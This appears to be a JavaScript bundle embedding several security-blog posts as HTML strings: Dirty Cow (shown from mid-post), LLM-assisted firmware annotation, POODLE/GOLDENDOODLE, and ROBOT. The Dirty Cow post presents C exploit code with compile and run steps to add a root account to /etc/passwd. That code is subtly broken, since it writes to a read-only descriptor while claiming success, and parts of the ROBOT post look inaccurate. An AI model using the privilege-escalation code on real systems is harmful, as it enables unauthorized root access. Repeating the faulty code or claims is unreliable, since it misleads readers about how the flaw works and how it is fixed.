        <p>The Dirty Cow vulnerability enables an attacker to:</p>
        <ol>
          <li>Create a memory mapping of a file they want to overwrite.</li>
          <li>Exploit the race condition to bypass COW and write directly to the file.</li>
          <li>Modify files like <code>/etc/passwd</code> to add a root user or escalate privileges.</li>
        </ol>

        <h2>Demonstrating Dirty Cow (CVE-2016–5195)</h2>
        <p><strong>Disclaimer:</strong> This demonstration is for educational purposes only. Do not execute this on systems you do not own or have explicit permission to test.</p>

        <h3>Exploit Code</h3>
        <p>Save the following as <code>dirtycow.c</code>:</p>
        <div class="code-block">
          <code>
#include &lt;fcntl.h&gt;<br>
#include &lt;pthread.h&gt;<br>
#include &lt;string.h&gt;<br>
#include &lt;sys/mman.h&gt;<br>
#include &lt;stdio.h&gt;<br>
#include &lt;unistd.h&gt;<br><br>
char *target_file = "/etc/passwd";<br>
char *new_content = "hacked:x:0:0:hacked:/root:/bin/bash\\n";<br>
int f;<br><br>
void *madvise_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        madvise(arg, 100, MADV_DONTNEED);<br>
    }<br>
    return NULL;<br>
}<br><br>
void *write_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        lseek(f, 0, SEEK_SET);<br>
        write(f, new_content, strlen(new_content));<br>
    }<br>
    return NULL;<br>
}<br><br>
int main() {<br>
    f = open(target_file, O_RDONLY);<br>
    if (f &lt; 0) {<br>
        perror("Failed to open target file");<br>
        return 1;<br>
    }<br><br>
    char *map = mmap(NULL, 100, PROT_READ, MAP_PRIVATE, f, 0);<br>
    if (map == MAP_FAILED) {<br>
        perror("mmap failed");<br>
        return 1;<br>
    }<br><br>
    pthread_t t1, t2;<br>
    pthread_create(&amp;t1, NULL, madvise_thread, map);<br>
    pthread_create(&amp;t2, NULL, write_thread, NULL);<br><br>
    pthread_join(t1, NULL);<br>
    pthread_join(t2, NULL);<br><br>
    printf("Exploit complete. Check /etc/passwd for changes.\\n");<br>
    return 0;<br>
}
          </code>
        </div>

        <h3>Compiling and Running the Exploit</h3>
        <div class="code-block">
          <code>
# Compile the exploit<br>
gcc -pthread dirtycow.c -o dirtycow<br><br>
# Run the exploit<br>
./dirtycow<br><br>
# Check for changes<br>
cat /etc/passwd
          </code>
        </div>

        <p>Look for the new root user: <code>hacked:x:0:0:hacked:/root:/bin/bash</code>. You can now switch to this user:</p>
        <div class="code-block">
          <code>su hacked</code>
        </div>

        <h2>Mitigation</h2>
        <ol>
          <li><strong>Patch the Kernel:</strong> Update the Linux kernel to a version where the Dirty Cow vulnerability is fixed.</li>
          <li><strong>Use Access Controls:</strong> Restrict write access to sensitive files like <code>/etc/passwd</code> and <code>/etc/shadow</code> to privileged users only.</li>
          <li><strong>Enable SELinux or AppArmor:</strong> Mandatory Access Control frameworks can prevent unauthorized file modifications.</li>
          <li><strong>Limit Privileges:</strong> Run services and applications with the least privileges necessary to function.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Dirty Cow serves as a stark reminder of the potential impact of race conditions and privilege escalation vulnerabilities. While the Linux kernel is robust, vulnerabilities like this highlight the need for regular updates, proper system configuration, and defense-in-depth security practices.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Zh=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Firmware Exploration: LLM as Your Annotator</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      line-height: 1.6;
      max-width: 900px;
      margin: 2rem auto;
      padding: 0 1rem;
      color: #111827;
      background: #f9fafb;
    }
    h1, h2, h3 {
      color: #111827;
    }
    h1 {
      font-size: 2.2rem;
      margin-bottom: 0.5rem;
    }
    h2 {
      margin-top: 2rem;
      border-bottom: 1px solid #e5e7eb;
      padding-bottom: 0.25rem;
    }
    h3 {
      margin-top: 1.5rem;
    }
    code {
      font-family: "Fira Code", Menlo, Monaco, Consolas, "Courier New", monospace;
      font-size: 0.9rem;
    }
    pre {
      background: #111827;
      color: #e5e7eb;
      padding: 1rem;
      border-radius: 0.5rem;
      overflow-x: auto;
      font-size: 0.9rem;
    }
    blockquote {
      border-left: 4px solid #3b82f6;
      padding-left: 1rem;
      color: #374151;
      margin: 1rem 0;
      background: #eff6ff;
    }
    ul, ol {
      padding-left: 1.4rem;
    }
    hr {
      border: 0;
      border-top: 1px solid #e5e7eb;
      margin: 2rem 0;
    }
    .emoji {
      font-style: normal;
    }
  </style>
</head>
<body>

  <h1>Firmware Exploration: LLM as Your Annotator</h1>

  <p>
    If you’ve ever opened a firmware image and stared at a hex dump thinking “nope,” you’re not alone.
  </p>

  <p>
    Modern IoT and embedded devices ship with complex firmware: full Linux distributions, RTOS kernels, proprietary bootloaders, custom update mechanisms, and often… questionable security decisions. Large-scale studies have shown that firmware is a gold mine for vulnerabilities, from hard-coded credentials to unsafe update logic and exposed debug interfaces.
  </p>

  <p>
    At the same time, governments and standards bodies are pushing manufacturers to treat firmware security seriously. NIST’s IoT Cybersecurity guidance and documents like SP 800-213/213A explicitly call out firmware, update mechanisms, and device integrity as critical capabilities for secure IoT products.
  </p>

  <p>
    In this post, I’m <strong>not</strong> going to pretend that a Large Language Model (LLM) will magically reverse engineer your firmware for you. Instead, I’ll show how you can use an LLM as an <strong>annotator and sidekick</strong> while you do the real work:
  </p>

  <ul>
    <li>Turning messy <strong>strings</strong> into structured hints</li>
    <li>Summarizing <strong>decompiled functions</strong></li>
    <li>Hypothesizing the purpose of weird <strong>config blobs and scripts</strong></li>
    <li>Supporting your <strong>threat modeling</strong> of the device</li>
  </ul>

  <p>All in a way that keeps you in control, and the AI in a supporting role.</p>

  <blockquote>
    <span class="emoji">⚠️</span> Everything here is about <strong>defensive security / research on devices you own or are authorized to test</strong>.
    Don’t use these techniques on systems you’re not allowed to touch.
  </blockquote>

  <hr />

  <h2>1. The Traditional Firmware Exploration Workflow (Very Short Version)</h2>

  <p>A very typical firmware exploration flow looks like this:</p>

  <ol>
    <li>
      <strong>Obtain firmware</strong><br />
      From a vendor update file, web UI, or by dumping flash via JTAG / SPI.
    </li>
    <li>
      <strong>Triage and unpack</strong><br />
      Use tools like <code>binwalk</code>, <code>dd</code>, <code>unsquashfs</code>, or <code>firmware-mod-kit</code> to unpack file systems and images.
    </li>
    <li>
      <strong>Scan for strings and patterns</strong><br />
      Use <code>strings</code>, <code>grep</code>, or custom scripts to find credentials, URLs, debug commands, etc.
    </li>
    <li>
      <strong>Reverse engineer binaries</strong><br />
      Use tools like <strong>Ghidra</strong>, IDA, Radare2, or Binary Ninja to analyze executables and libraries.
    </li>
    <li>
      <strong>Dynamic analysis / rehosting</strong><br />
      Use QEMU or specialized frameworks for firmware rehosting to actually run firmware in a controlled environment and interact with it.
    </li>
  </ol>

  <p>
    Each step is noisy and produces walls of text and code. That’s where an LLM can make things <strong>less painful</strong>.
  </p>

  <hr />

  <h2>2. Where LLMs Actually Help: “Annotator, Not Autopilot”</h2>

  <p>
    Recent work has looked at using LLMs for <strong>binary code understanding</strong>, such as:
  </p>
  <ul>
    <li>Recovering function names</li>
    <li>Summarizing binary code behavior</li>
    <li>Explaining decompiled functions at a higher level</li>
  </ul>

  <p>
    Industry research has also explored LLMs as <strong>reverse engineering sidekicks</strong> that help malware analysts explain decompiled functions, outline control flows, or draft detection logic—without replacing analysts.
  </p>

  <blockquote>
    <strong>You</strong> do the reversing.<br />
    <strong>The LLM</strong> helps label, summarize, cluster, and explain.
  </blockquote>

  <p>
    Think of it as a hyperactive junior sitting next to you, happy to generate function names, markdown notes, and hypotheses while you decide what’s real and what’s hallucination.
  </p>

  <p>Let’s walk through some concrete examples.</p>

  <hr />

  <h2>3. Strings + LLM: Turning Noise Into Hints</h2>

  <p>A classic first step on a firmware image is just:</p>

  <pre><code>strings firmware.bin | less</code></pre>

  <p>
    But this dumps <em>everything</em>: menu texts, error messages, random config keys, leftover debug prints, etc. You can make this a lot more effective with a little Python and an LLM.
  </p>

  <h3>3.1 Step 1 – Extract and filter strings</h3>

  <p>Here’s a small Python script to extract printable strings from a firmware blob:</p>

  <pre><code>import re
from pathlib import Path

def extract_strings(path, min_len=4):
    data = Path(path).read_bytes()
    pattern = rb"[ -~]{%d,}" % min_len  # printable ASCII
    return [s.decode(errors="ignore") for s in re.findall(pattern, data)]

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")

    # Naive filters: paths, URLs, shell-like commands
    interesting = [
        s for s in strings
        if ("/" in s or "http" in s or "ssh" in s or "admin" in s.lower())
    ]

    for s in interesting[:50]:
        print(s)</code></pre>

  <p>
    You now have a list of “interesting” candidate strings: endpoints, file paths, error messages, maybe even hidden menu options.
  </p>

  <h3>3.2 Step 2 – Ask the LLM to annotate</h3>

  <p>
    Take a subset of these strings (don’t paste your entire firmware dump into a cloud LLM—be mindful of confidentiality) and send them to an LLM with a prompt like:
  </p>

  <blockquote>
    You are an embedded security analyst.<br />
    The following strings were extracted from a router firmware image.<br /><br />
    1. <code>/bin/diagnostic_cli</code><br />
    2. <code>/usr/sbin/backup_cfg</code><br />
    3. <code>POST /apply.cgi</code><br />
    4. <code>admin:admin</code><br />
    5. <code>Enable remote management</code><br /><br />
    For each string:<br />
    - Guess what subsystem it might belong to (web UI, update system, debug, etc.).<br />
    - Mark whether it’s <strong>interesting for security review</strong> and why (1–2 sentences).
  </blockquote>

  <p>
    In code (pseudo-style, using a generic <code>llm_chat()</code> helper so you can plug in OpenAI / local LLM / etc.):
  </p>

  <pre><code>def annotate_strings_with_llm(strings_chunk):
    prompt = (
        "You are an embedded firmware security analyst.\\n\\n"
        "You are given a list of strings extracted from firmware.\\n"
        "For each string, produce:\\n"
        "- category: (web_ui | auth | config | debug | logging | update | other)\\n"
        "- interesting: (yes/no)\\n"
        "- reason: one short sentence.\\n\\n"
        "Strings:\\n"
        + "\\n".join(f"- {s}" for s in strings_chunk)
    )
    # Replace this with your LLM client call
    response = llm_chat(prompt)
    return response

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")
    interesting = [...]  # apply your filters
    chunk = interesting[:40]
    print(annotate_strings_with_llm(chunk))</code></pre>

  <p>
    Suddenly, instead of reading 300 anonymous strings, you get a <strong>structured, human-readable checklist</strong>:
  </p>

  <ul>
    <li>Possible backup subsystem</li>
    <li>Potential default creds</li>
    <li>Hidden diagnostic binaries</li>
    <li>Suspicious URLs / endpoints</li>
  </ul>

  <p>
    You still have to verify everything—but now you have a <strong>prioritized map</strong>.
  </p>

  <hr />

  <h2>4. Ghidra + LLM: Explaining Weird Functions</h2>

  <p>
    Once you move into static analysis, tools like <strong>Ghidra</strong> are the workhorse for exploring firmware binaries. You load ELF/ARM/MIPS binaries, let Ghidra analyze them, and then decompile functions into a pseudo-C view.
  </p>

  <p>
    The hard part is not “disassembling”—it’s <strong>understanding</strong> what a function actually does.
  </p>

  <p>
    Research and experiments with LLMs show they can help with tasks like:
  </p>
  <ul>
    <li><strong>Function name recovery</strong></li>
    <li><strong>Code summarization</strong></li>
    <li>Highlighting security-relevant behavior (auth, crypto, file access, network I/O, etc.)</li>
  </ul>

  <p>That’s perfect for our “annotator” idea.</p>

  <h3>4.1 Workflow</h3>

  <ol>
    <li>
      In Ghidra, decompile a function you suspect is security-relevant:
      <ul>
        <li>Maybe it’s referenced from the <code>/login</code> CGI handler</li>
        <li>Or from a firmware update routine</li>
      </ul>
    </li>
    <li>Copy a sanitized snippet of the decompiled C-like code (omit hard-coded secrets / proprietary stuff if using a cloud LLM).</li>
    <li>Ask the LLM something like:</li>
  </ol>

  <blockquote>
    You are assisting with firmware reverse engineering.<br />
    Here is a decompiled function from an embedded Linux binary (MIPS):<br /><br />
    <pre><code>int sub_40123C(char *user, char *pw) {
    FILE *f = fopen("/etc/passwd", "r");
    if (!f) return -1;
    ...
}</code></pre>
    Tasks:<br />
    1. Give this function a descriptive name (C-style).<br />
    2. Summarize what it does in bullets.<br />
    3. Call out any security-relevant behavior (auth checks, file access, cryptography, etc.).
  </blockquote>

  <p>You’ll often get surprisingly good results:</p>

  <ul>
    <li>Suggested names like <code>check_user_credentials</code>, <code>verify_login</code>, etc.</li>
    <li>Bullet summaries that highlight comparisons, suspicious file paths, or insecure checks.</li>
  </ul>

  <p>
    You can even script this: export decompiled functions or their summaries and feed them to an LLM in batches, building a <strong>“map” of the binary</strong> where each function has:
  </p>

  <ul>
    <li>A human-readable name</li>
    <li>A short description</li>
    <li>Tags like <code>auth</code>, <code>crypto</code>, <code>network</code>, <code>update</code></li>
  </ul>

  <p>
    This mirrors workflows used in both academic research and experimental tools that use LLMs as reverse engineering assistants for malware and binaries.
  </p>

  <hr />

  <h2>5. Configs, Scripts, and “Weird Blobs”: Semantic Tagging</h2>

  <p>
    Firmware images are full of non-binary artifacts:
  </p>
  <ul>
    <li>Shell scripts for initialization</li>
    <li>Lua / Python / proprietary scripting languages</li>
    <li>JSON / XML / custom config formats</li>
    <li>Web templates for CGI-based admin interfaces</li>
  </ul>

  <p>Instead of manually reading each file, you can:</p>

  <ol>
    <li><strong>Programmatically find candidates</strong> – files under <code>/etc/</code>, <code>/usr/script/</code>, <code>/www/</code>, etc.</li>
    <li><strong>Summarize them with an LLM</strong> to label purpose and risk.</li>
  </ol>

  <h3>5.1 Example: scanning shell scripts</h3>

  <pre><code>from pathlib import Path

def list_shell_scripts(root):
    root = Path(root)
    return list(root.rglob("*.sh"))

def summarize_script(path):
    content = Path(path).read_text(errors="ignore")[:4000]  # truncate just in case
    prompt = (
        "You are reviewing firmware init scripts.\\n\\n"
        f"File path: {path}\\n"
        "Script:\\n\\n"
        "\`\`\`sh\\n"
        f"{content}\\n"
        "\`\`\`\\n\\n"
        "Tasks:\\n"
        "1. Briefly summarize what this script does.\\n"
        "2. Call out any security-relevant actions "
        "(starting services, changing permissions, touching auth/crypto, enabling remote access).\\n"
        "3. Rate its review priority: high / medium / low.\\n"
    )
    return llm_chat(prompt)

if __name__ == "__main__":
    for p in list_shell_scripts("squashfs-root"):
        print("=== ", p, " ===")
        print(summarize_script(p))
        print()</code></pre>

  <p>This gives you:</p>

  <ul>
    <li>A quick view of <strong>which scripts matter</strong> (e.g., those enabling remote management or manipulating firewall rules).</li>
    <li>A better starting point when you need to dive deeper manually.</li>
  </ul>

  <p>You can do the same for:</p>

  <ul>
    <li>JSON configs: ask which keys look like <strong>feature flags</strong>, <strong>debug options</strong>, or <strong>update URLs</strong>.</li>
    <li>HTTP templates: ask which endpoints perform sensitive operations.</li>
  </ul>

  <hr />

  <h2>6. LLMs + Rehosting: Augmenting Dynamic Analysis</h2>

  <p>
    The more hardcore end of firmware analysis involves <strong>rehosting</strong>: running firmware in an emulated environment to see how it behaves at runtime. Researchers and practitioners use various frameworks to emulate peripheral devices and remove hardware dependencies.
  </p>

  <p>LLMs can help here too—but again, as annotators:</p>

  <ul>
    <li>
      <strong>Log analysis:</strong> feed chunks of runtime logs (HTTP requests, kernel messages, application logs) into the LLM and ask it to:
      <ul>
        <li>Summarize what the system is doing</li>
        <li>Highlight errors, crashes, or suspicious patterns (e.g., repeated failed logins)</li>
      </ul>
    </li>
    <li>
      <strong>Crash triage:</strong> when fuzzers targeting BusyBox or embedded binaries produce crashing inputs and stack traces, LLMs can help cluster and explain crash types.
    </li>
  </ul>

  <h3>6.1 Example prompt for log triage</h3>

  <blockquote>
    You are a firmware analyst. The following log lines come from an emulated router firmware:<br /><br />
    <pre><code>[HTTPD] POST /apply.cgi action=wan_settings
[HTTPD] user=admin from 192.168.0.10
[KERNEL] device eth0 entered promiscuous mode
[APP] enabling remote_management on port 8080
...</code></pre>
    1. Summarize the key events.<br />
    2. Identify any security-relevant changes.<br />
    3. Suggest 2–3 follow-up checks I should perform against this firmware.
  </blockquote>

  <p>
    You get a quick <strong>human-level summary</strong> instead of reading 500 lines manually.
  </p>

  <hr />

  <h2>7. Limitations and Risks: This Is Not Magic (and That’s Good)</h2>

  <p>Before we get too excited, reality check:</p>

  <ol>
    <li>
      <strong>Hallucinations are real</strong><br />
      LLMs can improve naming and summarization, but they still get things wrong and may invent functionality that isn’t present.
      <ul>
        <li>Never treat LLM output as ground truth.</li>
        <li>Use it as a <strong>hint</strong>, then confirm by reading the actual code / disassembly.</li>
      </ul>
    </li>
    <li>
      <strong>Confidentiality and IP</strong><br />
      If you’re analyzing proprietary firmware, uploading large chunks to a cloud LLM may be unacceptable (legally, ethically, or by contract).
      <ul>
        <li>Consider <strong>local open-source models</strong> for sensitive work.</li>
        <li>Use strict data minimization: send only what you must (e.g., one function, one script).</li>
      </ul>
    </li>
    <li>
      <strong>Ethics and legality</strong><br />
      Secure development and IoT guidance emphasize secure design, responsible vulnerability management, and lifecycle support.
      <ul>
        <li>Use these techniques to <strong>improve</strong> security, not undermine it.</li>
        <li>Follow responsible disclosure practices if you discover real issues.</li>
      </ul>
    </li>
    <li>
      <strong>Skill still required</strong><br />
      Experiences from LLM-powered reverse engineering consistently conclude that LLMs <strong>augment experts</strong>; they don’t turn beginners into instant firmware ninjas.
      <ul>
        <li>You still need to know how toolchains, OSes, networking, and cryptography work.</li>
        <li>LLMs amplify good analysts; they don’t replace them.</li>
      </ul>
    </li>
  </ol>

  <hr />

  <h2>8. Practical Tips: Making LLMs a Useful Firmware Sidekick</h2>

  <p>If you want to actually integrate LLMs into your firmware workflow, here are some practical patterns:</p>

  <ol>
    <li>
      <strong>Use strong roles in prompts</strong>
      <ul>
        <li>“You are an embedded firmware security analyst.”</li>
        <li>“You are assisting reverse engineering of a MIPS-based router binary.”</li>
      </ul>
    </li>
    <li>
      <strong>Give context concisely</strong>
      <ul>
        <li>Mention architecture (ARM/MIPS/x86), OS (Linux/RTOS), and approximate purpose (router, camera, PLC).</li>
        <li>This helps the model make better guesses about functions and config files.</li>
      </ul>
    </li>
    <li>
      <strong>Chunk smartly</strong>
      <ul>
        <li>Don’t send entire file systems.</li>
        <li>Work per-function, per-script, or per-log-chunk.</li>
      </ul>
    </li>
    <li>
      <strong>Always ask for structure</strong><br />
      Ask for JSON-like or bullet-pointed output, for example:
      <pre><code>{
  "function_name": "...",
  "high_level_summary": "...",
  "security_relevance": "..."
}</code></pre>
      <p>This makes it easier to feed back into your own tooling.</p>
    </li>
    <li>
      <strong>Build your own “knowledge notebook”</strong>
      <ul>
        <li>Store LLM explanations in markdown or a small database.</li>
        <li>Link them back to offsets / function addresses / file paths so you can quickly revisit them later.</li>
      </ul>
    </li>
    <li>
      <strong>Compare models</strong>
      <ul>
        <li>Some models are better at code; others at natural language.</li>
        <li>Try both cloud and local options, especially if you need privacy.</li>
      </ul>
    </li>
  </ol>

  <hr />
</body>
</html>`,em=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>POODLE and GOLDENDOODLE Attacks</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">POODLE and GOLDENDOODLE Attacks</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          Encryption protocols are the bedrock of secure online communication, ensuring that data transmitted over
          networks remains confidential and protected from unauthorized access. However, like any technology,
          encryption protocols can have vulnerabilities that skilled attackers can exploit. Two such attacks,
          <b>POODLE</b> (Padding Oracle On Downgraded Legacy Encryption) and <b>GOLDENDOODLE</b>, have gained
          attention for exploiting weaknesses in SSL and TLS, respectively. This blog provides an in-depth look at
          these attacks, how they work, and their implications for modern cybersecurity.
        </p>

        <h2>POODLE Attack (Padding Oracle On Downgraded Legacy Encryption)</h2>
        <h3>Introduction</h3>
        <p>
          The POODLE attack, discovered by Google researchers in October 2014, targets the SSL 3.0 (Secure Sockets
          Layer) protocol. Despite SSL 3.0 being considered obsolete and replaced by more secure protocols like TLS
          (Transport Layer Security), many servers and clients still support SSL 3.0 for backward compatibility
          reasons. This presents a security risk as POODLE takes advantage of vulnerabilities in how SSL 3.0
          implements padding for block cipher encryption, enabling attackers to decrypt sensitive information such
          as cookies, passwords, and session tokens.
        </p>

        <h3>How SSL 3.0 Works</h3>
        <p>
          SSL 3.0 uses block ciphers in CBC (Cipher Block Chaining) mode. This mode encrypts data by dividing it
          into fixed-size blocks, typically 64 or 128 bits. When the data is not a multiple of the block size,
          padding is added to fill the last block. This padding is where SSL 3.0’s vulnerability lies.
        </p>
        <p>
          When a message is decrypted, the padding is checked for correctness. However, SSL 3.0 does not explicitly
          verify the padding bytes, allowing attackers to use a padding oracle attack. If an attacker can observe
          how a server responds to different padding values, they can slowly infer the content of the encrypted
          message.
        </p>

        <h3>POODLE Attack Workflow</h3>
        <ol>
          <li>
            <b>Downgrade Attack:</b> Many browsers and servers that support TLS also support SSL 3.0 for backward
            compatibility. An attacker can exploit this by forcing the connection to downgrade from the more secure
            TLS protocol to SSL 3.0. This is done by intercepting and tampering with the initial handshake between
            the client and the server.
          </li>
          <li>
            <b>Padding Oracle Exploitation:</b> Once SSL 3.0 is being used, the attacker can send maliciously
            crafted requests containing intentionally incorrect padding. Based on the server’s response (e.g., an
            error message or no response), the attacker can infer whether the padding was correct. This
            side-channel information can then be used to decrypt the message byte-by-byte.
          </li>
          <li>
            <b>Decrypting Sensitive Data:</b> With enough time and crafted requests, an attacker can decrypt data
            like authentication cookies, which are used to identify the user in a session. This allows the attacker
            to hijack the user’s session and potentially gain unauthorized access to sensitive information.
          </li>
        </ol>

        <h3>Vulnerable Systems</h3>
        <ul>
          <li>Systems that still support SSL 3.0 for backward compatibility.</li>
          <li>Systems that use CBC-mode cipher suites with SSL 3.0.</li>
        </ul>

        <h3>Impact</h3>
        <p>
          The POODLE attack poses a significant risk because it allows attackers to decrypt HTTPS-protected data,
          exposing sensitive user information. Once decrypted, this information can be used to impersonate users,
          steal credentials, and compromise web sessions.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Disable SSL 3.0:</b> Prevent POODLE attacks by disabling SSL 3.0 on both the client and server.</li>
          <li>
            <b>Enforce TLS-Only Communication:</b> Ensure that all clients and servers use TLS 1.2 or higher
            exclusively. By refusing to accept SSL 3.0 connections, you mitigate the possibility of an attacker
            forcing a downgrade.
          </li>
          <li>
            <b>Enable Secure Cipher Suites:</b> Use secure cipher suites that are not vulnerable to padding oracle
            attacks. Configure your web server to prioritize AEAD (Authenticated Encryption with Associated Data)
            cipher suites.
          </li>
        </ul>

        <h2>GOLDENDOODLE Attack</h2>
        <h3>Introduction</h3>
        <p>
          The GOLDENDOODLE attack, discovered in 2019, is an extension of padding oracle attacks. It specifically
          targets TLS 1.0, 1.1, and 1.2 implementations that use CBC-mode encryption. Like POODLE, it exploits
          vulnerabilities in block cipher padding.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Upgrade to TLS 1.3:</b> The most effective mitigation is upgrading to TLS 1.3.</li>
          <li>
            <b>Disable CBC-Mode Cipher Suites:</b> Use secure alternatives like GCM (Galois/Counter Mode), which is
            less prone to padding attacks.
          </li>
          <li>
            <b>Apply Security Patches:</b> Ensure systems are updated with the latest security patches for TLS
            implementations.
          </li>
        </ul>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,nm=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          In 2017, security researchers uncovered a vulnerability that re-exposed a nearly two-decade-old attack against RSA encryption in TLS (Transport Layer Security): the <b>ROBOT attack</b> (Return of Bleichenbacher’s Oracle Threat). Originally discovered by Daniel Bleichenbacher in 1998, the Bleichenbacher Oracle Attack allowed attackers to decrypt sensitive data, such as session keys, by exploiting certain flawed implementations of RSA.
        </p>
        <p>
          Despite advancements in cryptography, misconfigurations in modern RSA implementations have resurfaced this threat, putting specific systems at risk even today. This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.
        </p>

        <h2>How the ROBOT Attack Works</h2>
        <p>
          At the heart of the ROBOT attack is an interaction between a vulnerable server and an attacker where the server unintentionally leaks information about encrypted messages. This process allows attackers to decrypt RSA ciphertexts or perform signing operations with the server’s private key.
        </p>
        <p>
          The attacker sends deliberately malformed RSA ciphertexts to the server, and based on the server’s response (the “oracle”), they can infer details about the decrypted plaintext. By repeating this process enough times, they can eventually decrypt sensitive information.
        </p>

        <h3>Step-by-Step Breakdown of ROBOT:</h3>
        <ol>
          <li><b>Malformed Ciphertexts:</b> The attacker sends specially crafted RSA ciphertexts to the vulnerable server.</li>
          <li><b>Oracle Response:</b> The server attempts to decrypt the ciphertext and responds with information revealing whether the decryption was successful.</li>
          <li><b>Iteration Process:</b> The attacker uses the server’s responses to refine their guesses, repeating this process multiple times.</li>
          <li><b>Decryption of Sensitive Data:</b> After enough iterations, the attacker can decrypt sensitive data such as TLS session keys.</li>
        </ol>

        <h2>Real-World Example of ROBOT</h2>
        <p>
          To better understand how this attack can be used in real-world scenarios, consider a web server that uses RSA encryption to secure TLS connections. If the server’s RSA implementation is vulnerable, an attacker can exploit it to decrypt sensitive information.
        </p>
        <p>
          For example, if a banking website is vulnerable to ROBOT, an attacker could gain access to the TLS session keys, which would allow them to decrypt sensitive information such as login credentials, transaction details, and personal user data. This could lead to serious breaches in confidentiality and data security.
        </p>

        <h2>Affected Systems</h2>
        <p>Various widely-used products have been found vulnerable to ROBOT, including:</p>
        <ul>
          <li>OpenSSL (before version 1.0.2h)</li>
          <li>F5 Networks BIG-IP load balancers</li>
          <li>Cisco devices</li>
          <li>Certain Oracle and Citrix products</li>
        </ul>
        <p>
          Though many systems have since been patched, ROBOT still poses a risk to any system that hasn’t been updated to mitigate this vulnerability.
        </p>

        <h2>Mitigation and Prevention</h2>
        <p>
          Preventing ROBOT attacks requires system administrators and developers to ensure that their RSA implementations are correctly configured. Here are some steps to mitigate the risk of ROBOT:
        </p>
        <ul>
          <li><b>Disable RSA Encryption:</b> The most effective protection is to disable RSA key exchange in favor of Elliptic Curve Diffie-Hellman (ECDHE), which provides forward secrecy and is not vulnerable to ROBOT.</li>
          <li><b>Apply Security Patches:</b> Ensure that you’re using the latest versions of your software libraries and applying all relevant security patches. For instance, upgrading to OpenSSL 1.0.2h or later will mitigate the ROBOT attack.</li>
          <li><b>Implement Stronger Cryptographic Methods:</b> Use stronger encryption protocols such as Elliptic Curve Cryptography (ECC) to secure communications. ECC-based methods, like ECDHE, are considered more secure and resistant to attacks like ROBOT.</li>
          <li><b>Regular Vulnerability Testing:</b> Conduct routine vulnerability assessments and audits to identify and address potential misconfigurations or weaknesses in cryptographic implementations.</li>
        </ul>

        <h3>Example of Mitigation in OpenSSL:</h3>
<div class="code-block">
  <code>
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
  </code>
</div>
<p>
  This configuration forces the server to use Elliptic Curve Diffie-Hellman key exchange methods, providing forward secrecy and reducing the risk of a ROBOT attack.
</p>

        <h2>Conclusion</h2>
        <p>
          The ROBOT attack underscores how vulnerabilities from decades ago can resurface in modern systems due to misconfigurations or unpatched software. Although the original Bleichenbacher attack was discovered in 1998, its return in 2017 highlights the importance of staying vigilant in cryptographic practices and regularly updating systems.
        </p>
        <p>
          By disabling RSA key exchanges, patching vulnerable systems, and implementing stronger encryption protocols, administrators can effectively mitigate the risk of ROBOT attacks and protect sensitive data.
        </p>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
